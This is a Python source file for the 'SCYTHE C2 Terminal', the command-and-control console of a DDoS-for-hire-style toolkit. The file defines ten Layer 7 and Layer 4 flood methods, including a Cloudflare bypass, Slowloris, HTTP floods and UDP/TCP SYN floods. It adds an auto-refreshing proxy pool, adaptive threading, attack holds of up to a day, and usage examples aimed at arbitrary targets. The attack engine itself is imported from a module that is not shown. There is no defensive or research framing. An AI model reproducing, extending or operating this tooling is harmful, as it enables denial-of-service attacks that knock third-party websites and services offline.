#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  SCYTHE C2 TERMINAL v11.0 — FIXED BOX + SYNC WITH NEW ENGINE                ║
║  🔥 LAYER 7: 6 METHODS (httpbypass, cf-flood, slow, httpget, httpflood, auto)║
║  🔥 LAYER 4: 4 METHODS (udp, tcp, mixed, slowloris)                         ║
║  🔥 ATTACK BOX: Dynamic width, more info                                    ║
║  🔥 ALL BOXES: Fixed bottom border, professional                            ║
║  Built for: Alpha @scytheinhere88                                            ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import os
import sys
import time
import json
import re
import subprocess
import threading
import signal
import atexit
from datetime import datetime
from collections import deque

# ─── READLINE ───
try:
    import readline
    READLINE_AVAILABLE = True
except ImportError:
    READLINE_AVAILABLE = False
    class DummyReadline:
        def parse_and_bind(self, *args): pass
        def set_completer(self, *args): pass
        def add_history(self, *args): pass
        def get_history_item(self, *args): return None
    readline = DummyReadline()

# ─── IMPORTS ───
try:
    from state_manager import state, MAX_CONCURRENT, MAX_HOLD_TIME
except ImportError as e:
    print("[FATAL] state_manager.py not found.")
    sys.exit(1)

try:
    from attack_executor import AttackExecutor, get_vps_specs, calculate_rps_estimate, get_adaptive_threads
    from attack_executor import METHODS as ORIGINAL_METHODS
except ImportError as e:
    print("[FATAL] attack_executor.py not found.")
    sys.exit(1)

# ─── OVERRIDE METHODS ───
METHODS = {
    "httpbypass":  {"layer": 7, "type": "py", "engine": "l7", "desc": "CF bypass + header spoofing", "target": "Cloudflare, Akamai"},
    "cf-flood":    {"layer": 7, "type": "py", "engine": "l7", "desc": "CF header manipulation + cache bypass", "target": "Cloudflare"},
    "slow":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Slowloris connection hold", "target": "Apache, nginx"},
    "httpget":     {"layer": 7, "type": "py", "engine": "l7", "desc": "Standard GET flood with random paths", "target": "Any HTTP server"},
    "httpflood":   {"layer": 7, "type": "py", "engine": "l7", "desc": "Keep-alive connections, multiple requests", "target": "Load balancers"},
    "auto":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Auto-switch methods (adaptive)", "target": "Any"},
    "udp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP datagram flood", "target": "Game servers, DNS"},
    "tcp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP SYN flood", "target": "Web servers"},
    "mixed":       {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP + TCP mixed", "target": "Firewalls"},
    "slowloris":   {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP connection hold (L4 Slowloris)", "target": "Apache, nginx"},
}

# ─── COLORS ───
class C:
    G  = "\033[38;5;82m"
    P  = "\033[38;5;93m"
    C  = "\033[38;5;51m"
    R  = "\033[38;5;196m"
    Y  = "\033[38;5;226m"
    W  = "\033[38;5;255m"
    B  = "\033[1m"
    D  = "\033[2m"
    X  = "\033[0m"
    CL = "\033[2J\033[H"

SESSION_LOG = "c2_session.log"
COMMAND_HISTORY = deque(maxlen=1000)
SESSION_START = datetime.now()

def log_session(message, level="INFO"):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(SESSION_LOG, 'a') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    except:
        pass

AUTH_CODE = "654654"
MAX_ATTEMPTS = 3

def authenticate():
    os.system('clear')
    print(C.P + C.B + """
    ╔═══════════════════════════════════════════════════════════════╗
    ║  🔐 SCYTHE C2 TERMINAL — AUTHENTICATION REQUIRED              ║
    ║  Enter authentication code to access the system               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """ + C.X)
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        try:
            code = input(C.C + "[AUTH] Enter code: " + C.X).strip()
            if code == AUTH_CODE:
                print(C.G + "\n[✓] Authentication successful! Welcome, Alpha.\n" + C.X)
                log_session("Authentication successful", "AUTH")
                time.sleep(1)
                return True
            else:
                attempts += 1
                remaining = MAX_ATTEMPTS - attempts
                print(C.R + f"[✗] Invalid code. {remaining} attempts remaining.\n" + C.X)
                log_session(f"Authentication failed (attempt {attempts})", "AUTH")
                if remaining == 0:
                    print(C.R + "[✗] Maximum attempts exceeded. Exiting...\n" + C.X)
                    log_session("Authentication failed - max attempts exceeded", "AUTH")
                    return False
        except KeyboardInterrupt:
            print(C.R + "\n[✗] Authentication cancelled.\n" + C.X)
            log_session("Authentication cancelled by user", "AUTH")
            return False
        except EOFError:
            return False
    return False

BANNER = (
    C.P + C.B +
    "\n" +
    "    ░██████╗░█████╗░██╗░░░██╗████████╗██╗░░██╗███████╗\n" +
    "    ██╔════╝██╔══██╗╚██╗░██╔╝╚══██╔══╝██║░░██║██╔════╝\n" +
    "    ╚█████╗░██║░░╚═╝░╚████╔╝░░░░██║░░░███████║█████╗░░\n" +
    "    ░╚═══██╗██║░░██╗░░╚██╔╝░░░░░██║░░░██╔══██║██╔══╝░░\n" +
    "    ██████╔╝╚█████╔╝░░░██║░░░░░░██║░░░██║░░██║███████╗\n" +
    "    ╚═════╝░░╚════╝░░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝\n" +
    "    ═══════════ D E F I N E D  B Y  S I L E N C E D ════════════\n" +
    C.G + "\n" + """
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║  C2 COMMAND & CONTROL  —  MAXIMIZED EDITION v11.0                           ║
    ║  [MAX CONCURRENT: """ + str(MAX_CONCURRENT) + """]  [MAX HOLD: """ + str(MAX_HOLD_TIME) + """s]  [AUTO-PROXY]  ║
    ║  [ADAPTIVE THREADS: ON]  [RPS: LIVE — MAXIMIZED]  [SYNC: DASHBOARD]         ║
    ║  [METHODS: """ + str(len(METHODS)) + """ (6 L7 + 4 L4)]  [AUTH: ON]  [LOGGING: ON]  [HISTORY: ON]  ║
    ║  [SESSION: """ + SESSION_START.strftime("%Y-%m-%d %H:%M:%S") + """]                         ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
    """ + C.X
)

# ─── COMMAND HISTORY & AUTO-COMPLETE ───
class CommandHistory:
    def __init__(self):
        self.history = []
        self.index = 0
        self.load_history()

    def load_history(self):
        try:
            if os.path.exists(".c2_history"):
                with open(".c2_history", 'r') as f:
                    self.history = [line.strip() for line in f if line.strip()]
        except:
            pass

    def save_history(self):
        try:
            with open(".c2_history", 'w') as f:
                for cmd in self.history[-500:]:
                    f.write(cmd + '\n')
        except:
            pass

    def add(self, cmd):
        if cmd and cmd.strip():
            self.history.append(cmd.strip())
            if READLINE_AVAILABLE:
                readline.add_history(cmd.strip())
            self.save_history()

    def get_previous(self):
        if not self.history:
            return ""
        self.index = min(self.index + 1, len(self.history))
        return self.history[-self.index] if self.index <= len(self.history) else ""

    def get_next(self):
        if not self.history:
            return ""
        self.index = max(self.index - 1, 0)
        return self.history[-self.index] if self.index > 0 else ""

class TabCompleter:
    def __init__(self):
        self.commands = list(METHODS.keys()) + [
            'help', 'methods', 'ongoing', 'proxy', 'vps', 'layer7', 'layer4',
            'stop', 'stopall', 'getproxy', 'clear', 'exit', 'log', 'stats'
        ]

    def complete(self, text, state):
        text = text.lower()
        matches = [cmd for cmd in self.commands if cmd.startswith(text)]
        if state < len(matches):
            return matches[state]
        return None

if READLINE_AVAILABLE:
    readline.parse_and_bind("tab: complete")
    completer = TabCompleter()
    readline.set_completer(completer.complete)

# ─── BOX UTILITIES (with dynamic width) ───
def box(title, lines, color=C.G, width=None, padding=4):
    """Draw a fancy ASCII box with dynamic width based on content"""
    if width is None:
        # Calculate max line length
        max_len = len(title) + 2
        for line in lines:
            if isinstance(line, tuple):
                # For tuple, combine label and value
                if len(line) >= 2:
                    label = line[0]
                    value = line[1] if len(line) > 1 else ""
                    text = f" {label}: {value}"
                else:
                    text = str(line[0])
            else:
                text = str(line)
            # Strip color codes for length calculation
            clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
            max_len = max(max_len, len(clean) + 2)
        width = max_len + padding * 2
        width = max(70, min(width, 120))  # antara 70-120 karakter

    print(color + "╔" + ("═" * width) + "╗" + C.X)
    # Title
    title_pad = (width - len(title)) // 2
    print(color + "║" + " " * title_pad + C.B + title + C.X + " " * (width - len(title) - title_pad) + color + "║" + C.X)
    print(color + "╠" + ("═" * width) + "╣" + C.X)
    for line in lines:
        if isinstance(line, tuple):
            if len(line) == 3:
                label, value, val_color = line
                text = f" {label}: {val_color}{value}{C.X}"
            elif len(line) == 2:
                label, value = line
                text = f" {label}: {C.D}{value}{C.X}"
            else:
                text = f" {line[0]}"
        else:
            text = str(line)
        # Strip color codes for length calculation
        clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
        # Padding
        text_len = len(clean)
        pad_right = width - text_len - 1
        print(color + "║" + text + " " * pad_right + color + "║" + C.X)
    print(color + "╚" + ("═" * width) + "╝" + C.X)

# ─── BOXES ───
def attack_box(method, target, port, duration, hold_time, proxy_count, attack_id, rps_estimate, threads, layer):
    info = METHODS.get(method, {})
    lines = [
        ("Method", method.upper(), C.P),
        ("Layer", "L" + str(layer), C.C),
        ("Target", str(target) + ":" + str(port), C.C),
        ("Duration", str(duration) + " seconds", C.Y),
        ("Hold Time", str(hold_time) + " seconds", C.Y),
        ("Threads", str(threads) + " (adaptive)", C.G),
        ("Proxy Pool", str(proxy_count) + " active proxies", C.G),
        ("Est. RPS", "~" + str(rps_estimate) + " requests/sec", C.G),
        ("Attack ID", attack_id, C.C),
        "",
        ("Description", info.get("desc", "N/A")[:60], C.D),
        ("Best For", info.get("target", "N/A")[:60], C.D),
        "",
        C.G + C.B + " Attack successfully launched!" + C.X,
        C.D + " Use 'ongoing' to monitor real-time RPS and status." + C.X,
    ]
    box(" ⚡ ATTACK LAUNCHED ⚡ ", lines, C.P)
    log_session(f"Attack launched: {method} {target}:{port} {duration}s (ID: {attack_id})", "ATTACK")

def stop_box(attack_id, total_req, peak_rps, duration, total_bytes=0):
    lines = [
        ("Attack ID", attack_id, C.C),
        ("Total Requests", str(total_req), C.G),
        ("Peak RPS", str(peak_rps), C.P),
        ("Total Bytes", str(total_bytes), C.C),
        ("Duration", str(round(duration, 1)) + " seconds", C.Y),
        "",
        C.G + C.B + " Status: STOPPED" + C.X,
    ]
    box(" ATTACK TERMINATED ", lines, C.R)
    log_session(f"Attack stopped: {attack_id} | Requests: {total_req} | Peak RPS: {peak_rps}", "ATTACK")

def proxy_box(proxy_count, total_fetched, refreshing, vps_specs, rps_estimates):
    cpu, ram, disk = vps_specs
    l7_rps, l4_rps = rps_estimates
    lines = [
        ("Active Proxies", str(proxy_count), C.G),
        ("Total Scraped", str(total_fetched), C.C),
        ("Refresh Rate", "Every 7 seconds", C.Y),
        ("Status", "ACTIVE" if refreshing else "PAUSED", C.G if refreshing else C.Y),
        "",
        ("VPS CPU", str(cpu) + " cores", C.C),
        ("VPS RAM", str(round(ram, 1)) + " GB", C.C),
        ("VPS Disk", str(round(disk, 1)) + " GB", C.C),
        "",
        ("Est. L7 RPS", "~" + str(l7_rps) + " per attack", C.G),
        ("Est. L4 RPS", "~" + str(l4_rps) + " per attack", C.G),
        "",
        C.D + " Proxies auto-refresh from multiple sources every 7s" + C.X,
        C.D + " Pool grows infinitely — more time = more proxies = more RPS" + C.X,
    ]
    box(" PROXY POOL STATUS ", lines, C.C)

def vps_box():
    cpu_count, ram_gb, disk_gb = get_vps_specs()
    lines = [
        C.B + " CURRENT VPS SPECS:" + C.X,
        ("CPU", str(cpu_count) + " cores", C.C),
        ("RAM", str(round(ram_gb, 1)) + " GB", C.C),
        ("Disk", str(round(disk_gb, 1)) + " GB", C.C),
        "",
        C.B + " ADAPTIVE THREADS ESTIMATE:" + C.X,
        ("httpbypass", str(get_adaptive_threads('httpbypass', 60)) + " threads", C.G),
        ("cf-flood", str(get_adaptive_threads('cf-flood', 60)) + " threads", C.G),
        ("httpget", str(get_adaptive_threads('httpget', 60)) + " threads", C.G),
        ("udp", str(get_adaptive_threads('udp', 60)) + " threads", C.P),
        ("tcp", str(get_adaptive_threads('tcp', 60)) + " threads", C.P),
        ("mixed", str(get_adaptive_threads('mixed', 60)) + " threads", C.P),
        "",
        C.D + " Note: Threads auto-adjust based on VPS specs and duration" + C.X,
        C.D + " Shorter duration = more aggressive threads" + C.X,
        C.D + " Formula: cores * base_per_core * (60/duration)" + C.X,
    ]
    box(" VPS SPECIFICATIONS & ADAPTIVE THREADS ", lines, C.Y)

def status_box(data):
    active = data.get("active_attacks", [])
    proxy_pool = data.get("proxy_pool", 0)
    proxy_refresh = data.get("proxy_refreshing", False)
    resources = data.get("system_resources", {})

    lines = [
        ("System", data.get("system_status", "unknown").upper(), C.G),
        ("Active", str(len(active)) + "/" + str(MAX_CONCURRENT), C.Y if len(active) < MAX_CONCURRENT else C.R),
        ("Total RPS", str(data.get('total_rps', 0)), C.P),
        ("Total Requests", str(data.get('total_requests', 0)), C.G),
        ("Proxy Pool", str(proxy_pool) + (' (refreshing)' if proxy_refresh else ''), C.C),
        ("History", str(len(data.get('attack_history', []))) + " attacks", C.D),
        "",
        C.B + " SYSTEM RESOURCES:" + C.X,
        ("CPU", str(resources.get('cpu', 0)) + "%", C.C),
        ("RAM", str(resources.get('memory', 0)) + "%", C.C),
        ("Network", str(resources.get('network', 0)) + " bytes", C.D),
        "",
    ]
    if active:
        lines.append(C.B + " ONGOING ATTACKS:" + C.X)
        for atk in active:
            elapsed = time.time() - atk["start_time"]
            remaining = max(0, atk.get("hold_time", atk["duration"]) - elapsed)
            pct = min(100, (elapsed / max(atk["duration"], 1)) * 100)
            bar = C.G + ('█' * int(pct/5)) + C.P + ('░' * (20-int(pct/5))) + C.X
            threads = atk.get('threads', 'auto')
            lines.append(" " + C.C + atk['method'].ljust(12) + C.X + " " + bar + " " + str(round(pct, 1)) + "% | " + str(atk['rps']) + " RPS | " + str(int(remaining)) + "s | T:" + str(threads))
            lines.append(" " + C.D + " Target: " + atk['target'][:50] + " | Proxy: " + str(atk.get('proxy_count_current', 0)) + C.X)
    else:
        lines.append(" " + C.D + "No active attacks running" + C.X)
    box(" SYSTEM STATUS & ONGOING ATTACKS ", lines, C.C)

def methods_box():
    l7 = [(k, v) for k, v in METHODS.items() if v["layer"] == 7]
    l4 = [(k, v) for k, v in METHODS.items() if v["layer"] == 4]
    lines = []
    for name, info in l7:
        lines.append(" " + C.G + name.ljust(15) + C.X + " " + C.D + info['desc'][:55] + "..." + C.X)
    box(" LAYER 7 METHODS (" + str(len(l7)) + ") ", lines, C.G)
    print()
    lines = []
    for name, info in l4:
        lines.append(" " + C.P + name.ljust(15) + C.X + " " + C.D + info['desc'][:55] + "..." + C.X)
    box(" LAYER 4 METHODS (" + str(len(l4)) + ") ", lines, C.P)

def help_box():
    lines = [
        C.B + " UNIFIED ATTACK SYNTAX:" + C.X,
        " " + C.G + "method target port time [-hold N]" + C.X,
        " " + C.D + "Example: httpbypass https://target.com 443 60" + C.X,
        " " + C.D + "Example: httpbypass https://target.com 443 60 -hold 3600" + C.X,
        " " + C.D + "Example: udp 1.1.1.1 80 60" + C.X,
        " " + C.D + "Example: mixed 1.1.1.1 443 60 -hold 86400" + C.X,
        "",
        C.B + " SYSTEM COMMANDS:" + C.X,
        " " + C.G + "help" + C.X + "      - Show this help menu",
        " " + C.G + "methods" + C.X + "   - Show all 10 methods with descriptions",
        " " + C.G + "ongoing" + C.X + "   - Show active attacks and system status",
        " " + C.G + "proxy" + C.X + "     - Show proxy pool status + VPS specs + RPS estimates",
        " " + C.G + "vps" + C.X + "       - Show VPS specifications and adaptive threads",
        " " + C.G + "stop <id>" + C.X + " - Stop specific attack by ID",
        " " + C.G + "stopall" + C.X + "   - Stop all active attacks immediately",
        " " + C.G + "getproxy" + C.X + "  - Manual proxy refresh from API",
        " " + C.G + "layer7" + C.X + "    - Show Layer 7 methods only",
        " " + C.G + "layer4" + C.X + "    - Show Layer 4 methods only",
        " " + C.G + "clear" + C.X + "     - Clear terminal screen",
        " " + C.G + "log" + C.X + "       - Show session log",
        " " + C.G + "stats" + C.X + "      - Show performance statistics",
        " " + C.G + "exit" + C.X + "      - Exit C2 terminal",
        "",
        C.B + " HOLD FEATURE:" + C.X,
        "  - Use -hold N to set maximum hold time (default: 86400s)",
        "  - Attack runs for 'time' seconds, slot reserved for 'hold' seconds",
        "  - Example: 60 -hold 3600 = attack 60s, hold slot 3600s",
        "",
        C.B + " AUTO FEATURES:" + C.X,
        "  - Proxy auto-refresh: Every 7 seconds from multiple sources",
        "  - Adaptive threads: Auto-adjusts based on VPS specs",
        "  - Rate optimization: System auto-adjusts based on proxy count",
        "  - RPS is LIVE: Parsed from actual attack process stdout",
        "",
        C.B + " AUTHENTICATION:" + C.X,
        "  - Code: 654654 (required on startup)",
        "  - Max attempts: 3",
        "",
        C.B + " SESSION FEATURES:" + C.X,
        "  - Command history: Saved to .c2_history",
        "  - Session logging: Saved to c2_session.log",
        "  - Auto-complete: Tab key",
        "  - Up/Down arrows: Command history navigation",
        "",
        C.B + " DASHBOARD:" + C.X,
        "  Web UI: http://<vps-ip>:1837",
        "  Live RPS, active attacks, proxy stats, attack history",
    ]
    box(" SCYTHE C2 COMMAND REFERENCE ", lines, C.G)

def stats_box():
    active = state.state.get("active_attacks", [])
    history = state.state.get("attack_history", [])
    method_stats = state.state.get("method_stats", {})

    total_attacks = len(history) + len(active)
    total_requests = sum(a.get("total_requests", 0) for a in history) + sum(a.get("total_requests", 0) for a in active)

    lines = [
        C.B + " PERFORMANCE STATISTICS:" + C.X,
        ("Total Attacks", str(total_attacks), C.C),
        ("Total Requests", str(total_requests), C.G),
        ("Active Attacks", str(len(active)), C.Y),
        ("History Size", str(len(history)), C.D),
        ("Session Duration", str((datetime.now() - SESSION_START).total_seconds() // 60) + " minutes", C.D),
        "",
        C.B + " METHOD USAGE:" + C.X,
    ]

    if method_stats:
        sorted_methods = sorted(method_stats.items(), key=lambda x: x[1]['uses'], reverse=True)[:10]
        for method, stats in sorted_methods:
            lines.append(" " + C.C + method.ljust(15) + C.X + " Uses: " + str(stats['uses']) + " | Req: " + str(stats['total_requests']) + " | Peak RPS: " + str(stats['peak_rps']))
    else:
        lines.append(" " + C.D + "No method statistics yet" + C.X)

    box(" PERFORMANCE STATISTICS ", lines, C.P)

def log_box():
    try:
        if os.path.exists(SESSION_LOG):
            with open(SESSION_LOG, 'r') as f:
                log_lines = f.readlines()[-30:]
            lines = []
            for line in log_lines:
                lines.append(" " + C.D + line.strip()[:70] + C.X)
            box(" SESSION LOG (LAST 30 LINES) ", lines, C.Y)
        else:
            box(" SESSION LOG ", [" " + C.D + "No log file found" + C.X], C.Y)
    except:
        box(" SESSION LOG ", [" " + C.R + "Error reading log" + C.X], C.R)

# ─── COMMAND HANDLER ───
class CommandHandler:
    def __init__(self):
        self.executor = AttackExecutor()
        self.history = CommandHistory()
        self.running = True

    def handle(self, cmd_line):
        parts = cmd_line.strip().split()
        if not parts:
            return True

        cmd = parts[0].lower()

        self.history.add(cmd_line)
        log_session(f"Command: {cmd_line}", "CMD")

        # ─── ATTACK COMMAND ───
        if cmd in METHODS:
            if len(parts) < 4:
                print(C.R + "[ERROR]" + C.X + " Usage: " + cmd + " <target> <port> <time> [-hold N]")
                print(C.D + " Example: " + cmd + " https://target.com 443 60" + C.X)
                print(C.D + " Example: " + cmd + " https://target.com 443 60 -hold 3600" + C.X)
                print(C.D + " Example: " + cmd + " 1.1.1.1 80 60" + C.X)
                return True

            target = parts[1]
            port = parts[2]
            time_val = parts[3]
            hold_time = None

            for i, p in enumerate(parts):
                if p.lower() == "-hold" and i + 1 < len(parts):
                    try:
                        hold_time = int(parts[i + 1])
                    except:
                        pass
                    break

            if METHODS[cmd]["layer"] == 7 and not target.startswith("http"):
                target = "https://" + target

            layer = METHODS[cmd]["layer"]
            proxy_count = self.executor.get_proxy_count()
            threads = get_adaptive_threads(cmd, int(time_val))
            l7_rps, l4_rps = calculate_rps_estimate(proxy_count, len(state.state["active_attacks"]) + 1)
            rps_estimate = l7_rps if layer == 7 else l4_rps

            success = self.executor.execute(cmd, target, port, time_val, hold_time)
            if success:
                active = state.state["active_attacks"]
                attack_id = active[-1]["id"] if active else "unknown"
                attack_box(
                    method=cmd,
                    target=target,
                    port=port,
                    duration=time_val,
                    hold_time=hold_time or int(time_val),
                    proxy_count=proxy_count,
                    attack_id=attack_id,
                    rps_estimate=rps_estimate,
                    threads=threads,
                    layer=layer
                )
            return True

        # ─── SYSTEM COMMANDS ───
        if cmd == "help":
            help_box()
        elif cmd == "methods" or cmd == "l7" or cmd == "layer7":
            methods_box()
        elif cmd == "l4" or cmd == "layer4":
            l4 = [(k, v) for k, v in METHODS.items() if v["layer"] == 4]
            lines = [" " + C.P + k.ljust(15) + C.X + " " + C.D + v['desc'][:55] + "..." + C.X for k, v in l4]
            box(" LAYER 4 METHODS (" + str(len(l4)) + ") ", lines, C.P)
        elif cmd == "ongoing":
            status_box(state.get_state())
        elif cmd == "proxy":
            proxy_count = self.executor.get_proxy_count()
            data = state.get_state()
            proxy_box(
                proxy_count,
                data.get("proxy_total_fetched", 0),
                data.get("proxy_refreshing", False),
                get_vps_specs(),
                calculate_rps_estimate(proxy_count, max(len(state.state["active_attacks"]), 1))
            )
        elif cmd == "vps":
            vps_box()
        elif cmd == "stop":
            if len(parts) > 1:
                self.executor.stop_attack(parts[1])
                log_session(f"Manual stop: {parts[1]}", "STOP")
            else:
                print(C.R + "[ERROR]" + C.X + " Usage: stop <attack_id>")
        elif cmd == "stopall":
            self.executor.stop_all()
            log_session("Stop all attacks", "STOP")
        elif cmd == "getproxy":
            print(C.C + "[PROXY]" + C.X + " Manual refresh triggered...")
            subprocess.run(["python3", "getproxy.py"], capture_output=True)
            count = self.executor.get_proxy_count()
            print(C.G + "[DONE]" + C.X + " Proxy pool: " + str(count) + " proxies")
            log_session(f"Manual proxy refresh: {count} proxies", "PROXY")
        elif cmd == "stats":
            stats_box()
        elif cmd == "log":
            log_box()
        elif cmd == "clear":
            os.system('clear')
            print(BANNER)
        elif cmd == "exit":
            print(C.R + "[EXIT]" + C.X + " Shutting down C2...")
            log_session("C2 shutdown", "EXIT")
            self.executor.stop_all()
            self.executor.stop_proxy_refresh()
            self.running = False
            return False
        else:
            print(C.R + "[ERROR]" + C.X + " Unknown command: " + cmd)
            print(C.C + "[INFO]" + C.X + " Type 'help' for available commands")

        return True

def save_history_on_exit():
    try:
        if os.path.exists(".c2_history"):
            with open(".c2_history", 'w') as f:
                for cmd in list(COMMAND_HISTORY)[-500:]:
                    f.write(cmd + '\n')
    except:
        pass

atexit.register(save_history_on_exit)

# ─── MAIN ───
def main():
    if not authenticate():
        print(C.R + "[✗] Authentication failed. Exiting...\n" + C.X)
        sys.exit(1)

    os.system('clear')
    print(BANNER)

    handler = CommandHandler()

    print("")
    print(C.C + "[INIT]" + C.X + " Loading proxy pool...")
    try:
        subprocess.run(["python3", "getproxy.py"], capture_output=True, timeout=30)
    except:
        pass
    count = handler.executor.get_proxy_count()
    print(C.G + "[READY]" + C.X + " Proxy pool: " + str(count) + " proxies loaded")

    cpu, ram, disk = get_vps_specs()
    l7_rps, l4_rps = calculate_rps_estimate(count, 1)
    print(C.G + "[READY]" + C.X + " VPS: " + str(cpu) + " cores | " + str(round(ram, 1)) + "GB RAM | " + str(round(disk, 1)) + "GB disk")
    print(C.G + "[READY]" + C.X + " Est. RPS: L7 ~" + str(l7_rps) + " | L4 ~" + str(l4_rps))
    print(C.G + "[READY]" + C.X + " Adaptive threads: ON")
    print(C.G + "[READY]" + C.X + " C2 Terminal initialized. Max concurrent: " + str(MAX_CONCURRENT))
    print(C.G + "[READY]" + C.X + " Methods loaded: " + str(len(METHODS)) + " (6 L7 + 4 L4)")
    print(C.C + "[INFO]" + C.X + " Dashboard: http://<vps-ip>:1837")
    print(C.C + "[INFO]" + C.X + " Syntax: method target port time [-hold N]")
    print(C.D + " Example: httpbypass https://target.com 443 60 -hold 3600" + C.X)
    print(C.D + " Example: udp 1.1.1.1 80 60" + C.X)
    print(C.D + " Tip: Press TAB for auto-complete, UP/DOWN for history" + C.X)
    print("")

    while handler.running:
        try:
            ts = datetime.now().strftime("%H:%M:%S")
            active_count = len(state.state["active_attacks"])
            status_color = C.G if active_count < MAX_CONCURRENT else C.R
            total_rps = state.state.get('total_rps', 0)

            prompt = (
                C.P + "┌─[SCYTHE@C2]─[" + ts + "]─[" + status_color + str(active_count) + "/" + str(MAX_CONCURRENT) + C.P + "]─[" + C.C + str(total_rps) + " RPS" + C.P + "]" + "\n" +
                C.P + "└──╼ " + C.G + "$ " + C.X
            )
            cmd = input(prompt)

            if cmd:
                COMMAND_HISTORY.append(cmd)
                handler.handle(cmd)

        except KeyboardInterrupt:
            print("")
            print(C.Y + "[WARN]" + C.X + " Interrupted by user")
            handler.executor.stop_all()
            break
        except EOFError:
            break
        except Exception as e:
            print(C.R + "[ERROR]" + C.X + " " + str(e))
            log_session(f"Error: {str(e)}", "ERROR")

    print(C.R + "[OFFLINE]" + C.X + " C2 Terminal shutdown complete")
    log_session("C2 shutdown complete", "EXIT")
    sys.exit(0)

if __name__ == "__main__":
    main()